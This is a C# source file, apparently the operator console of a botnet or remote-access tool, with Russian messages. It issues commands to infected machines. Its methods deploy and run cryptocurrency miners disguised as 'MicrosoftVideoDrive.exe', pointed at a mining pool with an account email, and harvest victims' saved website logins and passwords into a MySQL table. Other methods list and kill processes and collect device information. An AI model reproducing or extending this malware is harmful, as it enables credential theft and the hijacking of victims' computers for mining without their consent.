using System;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using ServerWorker.Server;
using Interfaces;

namespace ServerWorker.ConsoleView
{
    public class ConsoleViewUserCommands : IConsoleCommands
    {
        public Action<IConsoleCommands> SwithCommander {get; set;} = delegate { };
        private User Current;
        public ConsoleViewUserCommands(User user)
        {
            Current = user;

            if (user.userData == null) 
            {
                try
                {
                    string key =  user.UsersCom.GetKey();
                    user.userData = new UserCard.UserData(key);
                    Console.WriteLine("UserKey: " + user.userData.id);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Error: " + ex.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                }
            }

            if (user.Ping < 450)
                GetSettings();
        }
        
        private List<String> _excludedMethods = new List<string>()
        {
            "Equals",
            "GetHashCode",
            "GetType",
            "ToString"
        };

        public void Help()
        {
            var methods = GetType().GetMethods().ToList();
            methods.Where(x => !_excludedMethods.Contains(x.Name)).ToList().ForEach(x => 
            {
                var parametrs = x.GetParameters().Select(p => p.ParameterType.Name + " " + p.Name).ToList();

                Console.WriteLine("{0}({1})",x.Name, string.Join(",", parametrs));
            });
        }

        public void SetMinerSettings(string valute)
        {
            switch (valute.ToLower())
            {
                case "none":
                    Current.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
                    break;
                case "xmr_cpu":
                    Current.UsersCom.SetMSettings(@"M\XMRCPU", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_CPU);
                    break;
                case "xmr_n":
                    Current.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
                    break;
                case "xmr_a":
                    Current.UsersCom.SetMSettings(@"M\XMRA", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_A);
                    break;
                case "eth_n":
                    Current.UsersCom.SetMSettings(@"M\ETHN", "Data", "MicrosoftVideoDrive.exe", "-U -S eth.pool.minergate.com:45791 -u xismatulin.ru@yandex.ru --cuda-parallel-hash 4", true, DDMiners.ETH_N);
                    break;
            }
        }

        public void GetLog()
        {
            Console.WriteLine("Loading...");
            var logs = Current.UsersCom.GetLog();
            logs.ForEach(x => Console.WriteLine(x));
        }

        public void DeviceInfo()
        {
            Console.WriteLine("Loading...");
            var infoDevice = Current.UsersCom.GetInfoDevice();
            Current.userData.infoDevice = infoDevice;

            Current.userData.infoDevice.GetListInfo().ForEach(x => Console.WriteLine(x));

              if (Current.userData.id != "")
                    Current.userData.SaveDataToFile(Current.userData.id + ".xml");
        }

        public void RunMiner()
        {
            Current.UsersCom.RunM();
        }

        public void ScreenShoot()
        {
            throw new Exception("Метод еще не реализован");
        }

        public void GetProcesses()
        {
            Console.WriteLine("Loading...");
            Current.UsersCom.GetListProc().ForEach(x => Console.WriteLine(x));
        }

        public void DirectoryViewer()
        {
            throw new Exception("Метод еще не реализован");
        }

        public void KillProc(string processName)
        {
            Current.UsersCom.KillProcess(processName);
        }

        public void GetSettings()
        {
            Console.WriteLine("Loading...");
            Current.userData.setting = Current.UsersCom.GetSetting();

            Console.Write( "Comp_name===>> \t");
            Console.WriteLine(Current.userData.setting.Comp_name);
            Console.Write("IsMiner===>> \t");
            Console.WriteLine(Current.userData.setting.IsMiner);
            Console.Write("Key===>> \t");
            Console.WriteLine(Current.userData.setting.Key);
            Console.Write("Open_sum===>> \t");
            Console.WriteLine(Current.userData.setting.Open_sum);
            Console.Write("Start_time===>> \t");
            Console.WriteLine(Current.userData.setting.Start_time);
            Console.Write("Version===>> \t");
            Console.WriteLine(Current.userData.setting.Version);
            Console.Write("MFTPFloader===>> \t");
            Console.WriteLine(Current.userData.setting.MFTPFloader);
            Console.Write("MLocalFloader===>> \t");
            Console.WriteLine(Current.userData.setting.MLocalFloader);
            Console.Write("MFileName===>> \t");
            Console.WriteLine(Current.userData.setting.MFileName);
            Console.Write("MArgs===>> \t");
            Console.WriteLine(Current.userData.setting.MArgs);
            Console.Write("MValut===>> \t");
            Console.WriteLine(Current.userData.setting.MValut);

              if (Current.userData.id != "")
                    Current.userData.SaveDataToFile(Current.userData.id + ".xml");
        }

        public void OpenChat()
        {
            throw new Exception("Метод еще не реализован");
        }

        public void Back()
        {
            SwithCommander.Invoke(new ConsoleViewCommands());
        }

        public void GoToDownloadCommander()
        {
            throw new Exception("Метод еще не реализован");
        }

        public void GetPass()
        {        
                var loginDataList = Current.UsersCom.SendLoginData("");

                MySQLData data = new MySQLData() { Table = Current.userData.id, Columns = new string[] { "Site", "Login", "Password"} };
                foreach (LoginData loginData in loginDataList)
                {
                    if (!string.IsNullOrWhiteSpace(loginData.WebSite) || !string.IsNullOrWhiteSpace(loginData.Login) || !string.IsNullOrWhiteSpace(loginData.Pass))
                        data.Values.Add(new string[] { loginData.WebSite, loginData.Login, loginData.Pass});
                }

                var dataCount = data.Values.Count;
                if (dataCount > 0)
                {
                    MySQLManager.CreateTable(Current.userData.id);
                    MySQLManager.Send(data);
                }
                else 
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Паролей не найдено");
                    Console.ForegroundColor = ConsoleColor.White;
                }

                loginDataList.ForEach(x => Console.WriteLine(x.WebSite + " " + x.Login + " " + x.Pass));
                
                Current.userData.IsGettingLoginData = true;
                if (Current.userData.id != "")
                    Current.userData.SaveDataToFile(Current.userData.id + ".xml");

                if (dataCount > 0) 
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Получено строк: " + dataCount);
                    Console.ForegroundColor = ConsoleColor.White;
                }
        }
    }
}